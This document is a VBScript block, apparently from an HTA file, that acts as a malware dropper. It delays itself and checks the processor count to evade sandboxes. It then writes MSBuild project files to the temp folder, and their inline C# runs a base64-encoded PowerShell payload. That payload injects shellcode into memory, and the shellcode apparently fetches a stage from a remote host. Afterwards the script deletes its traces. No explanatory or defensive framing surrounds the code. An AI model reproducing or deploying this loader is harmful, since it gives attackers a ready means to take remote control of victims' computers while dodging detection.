<script language=vbscript>
  On Error Resume Next

  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set objShell = CreateObject("WScript.Shell")
  objTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
  objWindir = objShell.ExpandEnvironmentStrings("%windir%")
  Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
  arrUnicorns = Array("JGZEV25Ea1ZZQnhvSGEgPSBAIg0KW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQpwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCB1aW50IGZsQWxsb2NhdGlvblR5cGUsIHVpbnQgZmxQcm90ZWN0KTsNCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRocmVhZChJbnRQdHIgbHBUaHJlYWRBdHRyaWJ1dGVzLCB1aW50IGR3U3RhY2tTaXplLCBJbnRQdHIgbHBTdGFydEFkZHJlc3MsIEludFB0ciBscFBhcmFtZXRlciwgdWludCBkd0NyZWF0aW9uRmxhZ3MsIEludFB0ciBscFRocmVhZElkKTsNCiJADQoNCiRZU0RKTUNhWSA9IEFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRmRFduRGtWWUJ4b0hhIC1OYW1lICJXaW4zMiIgLW5hbWVzcGFjZSBXaW4zMkZ1bmN0aW9ucyAtcGFzc3RocnUNCg0KW0J5dGVbXV0gJHNCY2xtVFJ0RENRZGloID0gMHhmYywweGU4LDB4ODIsMHgwLDB4MCwweDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGMwLDB4NjQsMHg4YiwweDUwLDB4MzAsMHg4YiwweDUyLDB4YywweDhiLDB4NTIsMHgxNCwweDhiLDB4NzIsMHgyOCwweGYsMHhiNywweDRhLDB4MjYsMHgzMSwweGZmLDB4YWMsMHgzYywweDYxLDB4N2MsMHgyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHhkLDB4MSwweGM3LDB4ZTIsMHhmMiwweDUyLDB4NTcsMHg4YiwweDUyLDB4MTAsMHg4YiwweDRhLDB4M2MsMHg4YiwweDRjLDB4MTEsMHg3OCwweGUzLDB4NDgsMHgxLDB4ZDEsMHg1MSwweDhiLDB4NTksMHgyMCwweDEsMHhkMywweDhiLDB4NDksMHgxOCwweGUzLDB4M2EsMHg0OSwweDhiLDB4MzQsMHg4YiwweDEsMHhkNiwweDMxLDB4ZmYsMHhhYywweGMxLDB4Y2YsMHhkLDB4MSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjYsMHgzLDB4N2QsMHhmOCwweDNiLDB4N2QsMHgyNCwweDc1LDB4ZTQsMHg1OCwweDhiLDB4NTgsMHgyNCwweDEsMHhkMywweDY2LDB4OGIsMHhjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgxLDB4ZDMsMHg4YiwweDQsMHg4YiwweDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDVmLDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlYiwweDhkLDB4NWQsMHg2OCwweDZlLDB4NjUsMHg3NCwweDAsMHg2OCwweDc3LDB4NjksMHg2ZSwweDY5LDB4NTQsMHg2OCwweDRjLDB4NzcsMHgyNiwweDcsMHhmZiwweGQ1LDB4MzEsMHhkYiwweDUzLDB4NTMsMHg1MywweDUzLDB4NTMsMHg2OCwweDNhLDB4NTYsMHg3OSwweGE3LDB4ZmYsMHhkNSwweDUzLDB4NTMsMHg2YSwweDMsMHg1MywweDUzLDB4NjgsMHhiYiwweDEsMHgwLDB4MCwweGU4LDB4M2MsMHgxLDB4MCwweDAsMHgyZiwweDc5LDB4NjUsMHg3OCwweDM3LDB4MmQsMHg0NCwweDY3LDB4NDQsMHg3MywweDc1LDB4NTEsMHgzNywweDQxLDB4N2EsMHg2ZiwweDQzLDB4NTksMHg2ZiwweDcyLDB4MzQsMHgzNiwweDc3LDB4NDEsMHgzNiwweDc5LDB4NDIsMHg3MCwweDRlLDB4NzYsMHg1OSwweDU4LDB4NDcsMHg2NCwweDQ2LDB4NDMsMHg0MSwweDU3LDB4NzEsMHgzMSwweDQzLDB4NTcsMHgzOCwweDVmLDB4NTgsMHg0ZCwweDRlLDB4MzksMHg0NSwweDZjLDB4MzQsMHg3MCwweDRlLDB4MzgsMHg0OCwweDMwLDB4NmQsMHgzNCwweDcyLDB4MzksMHg3OCwweDUwLDB4NmUsMHg3NCwweDVmLDB4NDEsMHg3MiwweDQ1LDB4NDgsMHgzNywweDM1LDB4NzgsMHg1MiwweDUyLDB4MzYsMHgyZCwweDMwLDB4NTcsMHg0YSwweDMwLDB4NTcsMHg1OCwweDY5LDB4NDksMHg2MSwweDY2LDB4NTMsMHg0NiwweDMxLDB4NGYsMHg2MiwweDRlLDB4NTksMHg0YiwweDdhLDB4NzgsMHg3MywweDQzLDB4NjQsMHg0ZiwweDM0LDB4NWEsMHg0MiwweDRhLDB4NDQsMHg1NywweDZjLDB4NWEsMHg2OSwweDM3LDB4NjMsMHg2MywweDZiLDB4MzYsMHg0NCwweDM3LDB4NDksMHg3NCwweDM1LDB4NjUsMHg3YSwweDc2LDB4N2EsMHg0YywweDMzLDB4NzksMHg0MywweDY2LDB4NDgsMHg1OSwweDU1LDB4NTcsMHg2NCwweDM4LDB4NzAsMHg0ZCwweDU3LDB4NDgsMHg2MSwweDZmLDB4NzAsMHg1MSwweDRmLDB4NTgsMHg3MSwweDQyLDB4NDgsMHg1MywweDMxLDB4NzEsMHg0ZCwweDQ4LDB4NDEsMHg3NywweDU5LDB4NDgsMHg0YiwweDY3LDB4NGEsMHg1MiwweDYzLDB4NDYsMHg1NSwweDZlLDB4NDcsMHg0YywweDQ5LDB4NmEsMHg2NiwweDVhLDB4NTgsMHg0MywweDAsMHg1MCwweDY4LDB4NTcsMHg4OSwweDlmLDB4YzYsMHhmZiwweGQ1LDB4ODksMHhjNiwweDUzLDB4NjgsMHgwLDB4MzIsMHhlMCwweDg0LDB4NTMsMHg1MywweDUzLDB4NTcsMHg1MywweDU2LDB4NjgsMHhlYiwweDU1LDB4MmUsMHgzYiwweGZmLDB4ZDUsMHg5NiwweDZhLDB4YSwweDVmLDB4NjgsMHg4MCwweDMzLDB4MCwweDAsMHg4OSwweGUwLDB4NmEsMHg0LDB4NTAsMHg2YSwweDFmLDB4NTYsMHg2OCwweDc1LDB4NDYsMHg5ZSwweDg2LDB4ZmYsMHhkNSwweDUzLDB4NTMsMHg1MywweDUzLDB4NTYsMHg2OCwweDJkLDB4NiwweDE4LDB4N2IsMHhmZiwweGQ1LDB4ODUsMHhjMCwweDc1LDB4MTQsMHg2OCwweDg4LDB4MTMsMHgwLDB4MCwweDY4LDB4NDQsMHhmMCwweDM1LDB4ZTAsMHhmZiwweGQ1LDB4NGYsMHg3NSwweGNkLDB4ZTgsMHg0YSwweDAsMHgwLDB4MCwweDZhLDB4NDAsMHg2OCwweDAsMHgxMCwweDAsMHgwLDB4NjgsMHgwLDB4MCwweDQwLDB4MCwweDUzLDB4NjgsMHg1OCwweGE0LDB4NTMsMHhlNSwweGZmLDB4ZDUsMHg5MywweDUzLDB4NTMsMHg4OSwweGU3LDB4NTcsMHg2OCwweDAsMHgyMCwweDAsMHgwLDB4NTMsMHg1NiwweDY4LDB4MTIsMHg5NiwweDg5LDB4ZTIsMHhmZiwweGQ1LDB4ODUsMHhjMCwweDc0LDB4Y2YsMHg4YiwweDcsMHgxLDB4YzMsMHg4NSwweGMwLDB4NzUsMHhlNSwweDU4LDB4YzMsMHg1ZiwweGU4LDB4NmIsMHhmZiwweGZmLDB4ZmYsMHgzMSwweDM5LDB4MzIsMHgyZSwweDMxLDB4MzYsMHgzOCwweDJlLDB4MzEsMHgzMCwweDJlLDB4MzYsMHgzOSwweDAsMHhiYiwweGYwLDB4YjUsMHhhMiwweDU2LDB4NmEsMHgwLDB4NTMsMHhmZiwweGQ1DQoNCg0KJEx4ZERZR2xLSyA9ICRZU0RKTUNhWTo6VmlydHVhbEFsbG9jKDAsW01hdGhdOjpNYXgoJHNCY2xtVFJ0RENRZGloLkxlbmd0aCwweDEwMDApLDB4MzAwMCwweDQwKQ0KDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRzQmNsbVRSdERDUWRpaCwwLCRMeGREWUdsS0ssJHNCY2xtVFJ0RENRZGloLkxlbmd0aCkNCg0KJFlTREpNQ2FZOjpDcmVhdGVUaHJlYWQoMCwwLCRMeGREWUdsS0ssMCwwLDApDQpmb3IgKDs7KXsKICBTdGFydC1zbGVlcCA2MAp9")

  ' Get logical processor count
  Set colComputerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
  For Each objComputerSystem In colComputerSystem
    objProcessorCount = objComputerSystem.NumberofLogicalProcessors
  Next

  ' Only run if system has more than 1 processor
  ' https://www.trustedsec.com/may-2015/bypassing-virtualization-and-sandbox-technologies/
  If objProcessorCount > 1 Then
    ' Sleep 60 seconds
    ' https://www.sans.org/reading-room/whitepapers/malicious/sleeping-sandbox-35797
    objShell.Run "%COMSPEC% /c ping -n 60 127.0.0.1>nul", 0, 1

    For Each objUnicorn in arrUnicorns
      x = x + 1

      ' Create MSBuild XML File
      CreateMSBuildXML objUnicorn, x

      ' Execute resource(x).xml using msbuild.exe and nps
      objShell.Run objWindir & "\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %TEMP%\resource" & x & ".xml", 0
    Next

    ' Cleanup
    For y = 1 To x
      Do While objFSO.FileExists(objTemp & "\resource" & y & ".xml")
        objShell.Run "%COMSPEC% /c ping -n 10 127.0.0.1>nul", 0, 1
        objFSO.DeleteFile(objTemp & "\resource" & y & ".xml")
      Loop
    Next
  End If

  window.close()

  ' Creates XML configuration files in the %TEMP% directory
  Function CreateMSBuildXML(objUnicorn, x)
    msbuildXML = "<Project ToolsVersion=" & CHR(34) & "4.0" & CHR(34) & " xmlns=" & CHR(34) & "http://schemas.microsoft.com/developer/msbuild/2003" & CHR(34) & ">" & vbCrLf &_
    "  <!-- This inline task executes c# code. -->" & vbCrLf &_
    "  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->" & vbCrLf &_
    "  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->" & vbCrLf &_
    "  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->" & vbCrLf &_
    "  <!-- License: BSD 3-Clause -->" & vbCrLf &_
    "  <Target Name=" & CHR(34) & "npscsharp" & CHR(34) & ">" & vbCrLf &_
    "   <nps />" & vbCrLf &_
    "  </Target>" & vbCrLf &_
    "  <UsingTask" & vbCrLf &_
    "    TaskName=" & CHR(34) & "nps" & CHR(34) & "" & vbCrLf &_
    "    TaskFactory=" & CHR(34) & "CodeTaskFactory" & CHR(34) & "" & vbCrLf &_
    "    AssemblyFile=" & CHR(34) & "C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" & CHR(34) & " >" & vbCrLf &_
    "  <Task>" & vbCrLf &_
    "    <Reference Include=" & CHR(34) & "System.Management.Automation" & CHR(34) & " />" & vbCrLf &_
    "      <Code Type=" & CHR(34) & "Class" & CHR(34) & " Language=" & CHR(34) & "cs" & CHR(34) & ">" & vbCrLf &_
    "        <![CDATA[" & vbCrLf &_
    "" & vbCrLf &_
    "          using System;" & vbCrLf &_
    "      using System.Collections.ObjectModel;" & vbCrLf &_
    "      using System.Management.Automation;" & vbCrLf &_
    "      using System.Management.Automation.Runspaces;" & vbCrLf &_
    "      using Microsoft.Build.Framework;" & vbCrLf &_
    "      using Microsoft.Build.Utilities;" & vbCrLf &_
    "" & vbCrLf &_
    "      public class nps : Task, ITask" & vbCrLf &_
    "        {" & vbCrLf &_
    "            public override bool Execute()" & vbCrLf &_
    "            {" & vbCrLf &_
    "              string cmd = " & CHR(34) & objUnicorn & CHR(34) & ";" & vbCrLf &_
    "              " & vbCrLf &_
    "                PowerShell ps = PowerShell.Create();" & vbCrLf &_
    "                ps.AddScript(Base64Decode(cmd));" & vbCrLf &_
    "" & vbCrLf &_
    "                Collection<PSObject> output = null;" & vbCrLf &_
    "                try" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    output = ps.Invoke();" & vbCrLf &_
    "                }" & vbCrLf &_
    "                catch(Exception e)" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    Console.WriteLine(" & CHR(34) & "Error while executing the script.\r\n" & CHR(34) & " + e.Message.ToString());" & vbCrLf &_
    "                }" & vbCrLf &_
    "                if (output != null)" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    foreach (PSObject rtnItem in output)" & vbCrLf &_
    "                    {" & vbCrLf &_
    "                        Console.WriteLine(rtnItem.ToString());" & vbCrLf &_
    "                    }" & vbCrLf &_
    "                }" & vbCrLf &_
    "                return true;" & vbCrLf &_
    "            }" & vbCrLf &_
    "" & vbCrLf &_
    "            public static string Base64Encode(string text) {" & vbCrLf &_
    "           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));" & vbCrLf &_
    "        }" & vbCrLf &_
    "" & vbCrLf &_
    "        public static string Base64Decode(string encodedtext) {" & vbCrLf &_
    "            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));" & vbCrLf &_
    "        }" & vbCrLf &_
    "        }" & vbCrLf &_
    "        ]]>" & vbCrLf &_
    "      </Code>" & vbCrLf &_
    "    </Task>" & vbCrLf &_
    "  </UsingTask>" & vbCrLf &_
    "</Project>"
    Set objFile = objFSO.CreateTextFile(objTemp & "\resource" & x & ".xml", True)
    objFile.WriteLine(msbuildXML)
    objFile.Close
  End Function
</script>